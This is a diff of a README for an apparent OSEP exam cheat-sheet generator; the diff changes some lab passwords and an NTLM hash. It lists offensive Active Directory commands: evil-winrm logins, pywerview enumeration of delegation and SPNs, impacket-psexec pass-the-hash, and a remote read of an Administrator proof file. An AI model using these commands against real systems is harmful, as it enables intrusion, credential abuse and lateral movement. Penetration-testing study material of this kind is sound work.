@@ -5,15 +5,18 @@ This is a tool which i created for my OSEP exam. It contains all important comma
 ## Usage
 
 **To Clean**
+```
 ┌──(root💀kali)-[/mnt/hgfs/Shared_Folder/OSEP-CHEATGEN/kali-generator]
 └─# ./cheat_gen.sh clean 
+```
 
 **To Genearte**
+```
 ┌──(root💀kali)-[/mnt/hgfs/Shared_Folder/OSEP-CHEATGEN/kali-generator]
 └─# ./cheat_gen.sh > comamnds.txt
+```
 
 **Output**
-
 
 ```
 ################################################
@@ -170,7 +173,7 @@ crackmapexec
 
 Invoke-Command -ComputerName dc02.dev.final.com -ScriptBlock {type C:\Users\Administrator\Desktop\proof.txt}
 
-evil-winrm -i 192.168.57.121 -u 'infinity\ted' -p 'fdsfYRTYd455dD'
+evil-winrm -i 192.168.57.121 -u 'infinity\ted' -p 'ksecurity'
 evil-winrm -i 192.168.57.121 -u 'infinity\ted' -H 'e929e69f7c290222be87968263a9282e'
 
 ######################
@@ -265,16 +268,16 @@ pywerview
 #  use --hashes if you dont have passwowrd.  )
 #  usefull: get-netdomaintrust, get-netgroupmember, get-netshare, get-netfileserver, get-netsubnet
 
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomain  -u 'ted'  -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD'
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomaintrust  -u 'ted'  -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD'
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' 
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' --unconstrained
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' -spn '*'
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroup  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' | awk 'NF' > groupts.txt
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroupmember  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' --groupname PswReaders
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' 
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'fdsfYRTYd455dD' --unconstrained
-python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser  -u 'ted' -d 'bolabola.com' -t 'dc03.bolabola.com'  -p 'fdsfYRTYd455dD' --spn 
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomain  -u 'ted'  -t 'dc03.infinity.com'  -p 'ksecurity'
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netdomaintrust  -u 'ted'  -t 'dc03.infinity.com'  -p 'ksecurity'
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' 
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' --unconstrained
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netcomputer  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' -spn '*'
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroup  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' | awk 'NF' > groupts.txt
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netgroupmember  -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' --groupname PswReaders
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' 
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser -u 'ted' -d 'infinity.com' -t 'dc03.infinity.com'  -p 'ksecurity' --unconstrained
+python3.9 /mnt/hgfs/Shared_Folder/Yo/lab1/pywerview/pywerview.py  get-netuser  -u 'ted' -d 'bolabola.com' -t 'dc03.bolabola.com'  -p 'ksecurity' --spn 
 
 
 # Compare Groups with the default groups and find the difff
@@ -308,7 +311,7 @@ IMPACKET
 # USE /etc/resolve.conf  #Because kerberos is  bitch.
 
 # PSEXEC (Pass the Hash)
-impacket-psexec -hashes ":e929e69f7c290222be87968263a9282e" "bolabola/ted"@192.168.57.121
+impacket-psexec -hashes ":e929eds9f7c290222be87968263a9282d" "bolabola/ted"@192.168.57.121
 impacket-psexec -no-pass -k  PROD.CORP1.COM/offsec@APPSRV01.PROD.CORP1.COM -dc-ip 192.168.57.70 
 
 # WMIEXEC (Pass the Hash)
